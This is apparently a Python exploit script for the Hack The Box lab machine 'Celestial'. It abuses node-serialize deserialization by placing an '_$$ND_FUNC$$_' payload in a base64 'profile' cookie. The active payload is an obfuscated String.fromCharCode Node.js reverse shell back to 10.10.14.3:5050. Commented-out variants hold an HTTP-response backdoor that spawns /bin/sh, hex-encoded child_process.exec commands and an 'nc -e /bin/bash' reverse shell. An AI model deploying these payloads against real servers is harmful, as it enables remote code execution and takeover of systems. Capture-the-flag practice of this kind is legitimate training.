import base64
import requests
import json

def gen_b64cookie(username,country,city,num):
    contents = {
            "username":"%s" % username,
            "country":"%s" % country,
            "city":"%s" % city,
            "num":"%s" % num
            }
    cookie_s = json.dumps(contents).replace(" ","").encode("utf-8")
    print ("[+] cookie contents: " + cookie_s.decode("utf-8"))
    cookie_b64 = (base64.b64encode(cookie_s).decode("utf-8"))
    return cookie_b64

#gen_b64cookie("Dummy","Idk Probably Somewhere Dumb","Lametown","1")

def send():
    burp0_url = "http://celestial.htb:3000/"
    #burp0_cookies = {"profile": "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D"}
    
    #trigger error
    #profile = gen_b64cookie("Dummy","Idk Probably Somewhere Dumb","Lametown","1'")
    
    #exploit
    #payload = "process.exit(0)"
    #payload = "console.log('it works!')"
    '''
    payload = "require('http').ServerResponse.prototype.end = (function (end) { \
            return function () { \
                if (this.socket._httpMessage.req.query.q === 'abc123') { \
                    ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket)) \
                        var cp = require('child_process') \
                        var net = require('net') \
                        var sh = cp.spawn('/bin/sh') \
                        sh.stdout.pipe(this.socket) \
                        sh.stderr.pipe(this.socket) \
                        this.socket.pipe(sh.stdin) \
                } else { \
                        end.apply(this, arguments) \
                } \
            } \
        })(require('http').ServerResponse.prototype.end)"

    payload = "require('child_process').exec(\'%s\')"
    #cmd = "nc 192.168.135.4 4040 -e /bin/bash"
    cmd = "ping -c1 10.10.14.3"
    encoded_cmd = cmd.encode().hex()
    split = zip(encoded_cmd[::2],encoded_cmd[1::2])
    split = map(''.join,split)
    final_cmd = '\\\\x' + '\\\\x'.join(split)
    payload = payload % final_cmd
    '''
    #python nodejsshell.py 10.10.14.3 5050
    payload = "function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,51,34,59,10,80,79,82,84,61,34,53,48,53,48,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"

    profile = gen_b64cookie("Dummy","Idk Probably Somewhere Dumb","Lametown","_$$ND_FUNC$$_%s" % payload)

    print ("[+] cookie: " + profile)

    burp0_cookies = {"profile": "%s" % profile}
    r = requests.get(burp0_url, cookies=burp0_cookies)
    print (r.text)
    pass

send()
